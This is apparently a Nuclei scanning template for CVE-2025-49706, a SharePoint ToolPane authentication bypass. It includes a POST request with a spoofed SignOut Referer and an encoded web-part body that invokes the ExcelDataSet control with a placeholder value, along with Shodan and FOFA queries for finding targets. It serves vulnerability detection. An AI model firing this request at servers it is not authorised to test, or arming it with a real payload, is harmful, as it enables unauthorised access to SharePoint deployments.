id: CVE-2025-49706

info:
  name: Microsoft Office SharePoint - Authentication Bypass
  author: pranjal
  severity: medium
  description: |
    Microsoft Office SharePoint contains an authentication bypass vulnerability that allows unauthorized attackers to execute code over a network. This vulnerability affects SharePoint ToolPane functionality and can lead to remote code execution.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to bypass authentication mechanisms and potentially execute arbitrary code on the SharePoint server, leading to unauthorized access and potential system compromise.
  remediation: |
    Apply the latest security updates provided by Microsoft to address this vulnerability. Ensure that SharePoint servers are properly configured with appropriate access controls and monitoring.
  reference:
    - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/sharepoint_toolpane_rce.rb
    - https://github.com/AdityaBhatt3010/CVE-2025-49706-SharePoint-Spoofing-Vulnerability-Under-Active-Exploitation
    - https://nvd.nist.gov/vuln/detail/CVE-2025-49706
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
    cvss-score: 7.5
    cve-id: CVE-2025-49706
    cwe-id: CWE-290
    epss-score: 0.00000
    epss-percentile: 0.00000
    cpe: cpe:2.3:a:microsoft:sharepoint_server:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: microsoft
    product: sharepoint_server
    shodan-query:
      - http.component:"sharepoint"
      - cpe:"cpe:2.3:a:microsoft:sharepoint_server"
    fofa-query:
      - app="Microsoft-SharePoint"
      - app="microsoft-sharepoint"
  tags: cve,cve2025,microsoft,sharepoint_server,authentication-bypass,toolpane

variables:
  test_payload: "CVE-2025-49706-Test"

http:
  - method: GET
    path:
      - "{{BaseURL}}/_layouts/15/ToolPane.aspx"
      - "{{BaseURL}}/_layouts/ToolPane.aspx"

    matchers-condition: and
    matchers:
      - type: regex
        part: header
        regex:
          - "(?i)(Microsoftsharepointteamservices:)"
        condition: or

      - type: word
        part: body
        words:
          - "ToolPane"
          - "SharePoint"
        condition: and

      - type: status
        status:
          - 200
          - 401
          - 403
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/_layouts/15/ToolPane.aspx"
      - "{{BaseURL}}/_layouts/ToolPane.aspx"

    headers:
      Content-Type: "application/x-www-form-urlencoded"
      Referer: "{{BaseURL}}/_layouts/SignOut.aspx"

    body: |
      MSOTlPn_Uri={{Scheme}}%3a//{{Hostname}}/_controltemplates/15/AclEditor.ascx&MSOTlPn_DWP=%3c%25%40%20Register%20Tagprefix%3d%22test%22%20Namespace%3d%22System.Web.UI%22%20Assembly%3d%22System.Web.Extensions%2c%20Version%3d4.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3d31bf3856ad364e35%22%20%25%3e%0a%3c%25%40%20Register%20Tagprefix%3d%22test2%22%20Namespace%3d%22Microsoft.PerformancePoint.Scorecards%22%20Assembly%3d%22Microsoft.PerformancePoint.Scorecards.Client%2c%20Version%3d16.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3d71e9bce111e9429c%22%20%25%3e%0a%20%20%3ctest%3aUpdateProgress%3e%0a%20%20%20%20%3cProgressTemplate%3e%0a%20%20%20%20%20%20%3ctest2%3aExcelDataSet%20CompressedDataTable%3d%22{{test_payload}}%22%20DataTable-CaseSensitive%3d%22true%22%20runat%3d%22server%22/%3e%0a%20%20%20%20%3c/ProgressTemplate%3e%0a%20%20%3c/test%3aUpdateProgress%3e%0a

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "MSOTlPn_DWP"
          - "ToolPane"
        condition: and

      - type: status
        status:
          - 200
          - 500
        condition: or

  - method: GET
    path:
      - "{{BaseURL}}/_api/web/siteusers"
      - "{{BaseURL}}/_api/web"

    headers:
      Accept: "application/json"
      Authorization: "Bearer"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "LoginName"
          - "Email"
          - "IsSiteAdmin"
        condition: and

      - type: status
        status:
          - 200
        condition: or

# digest: 4a0a00473045022100c3a5fc1baa8266d03d2229ed002bcde6a39a1ee1a3507f16da4d6d8a703d4df30220487c5c935be2f5dd19a20f428ac2aa67056d1d62a7ffafff3d5651c785dc1a61:922c64590222798bb761d5b6d8e72950
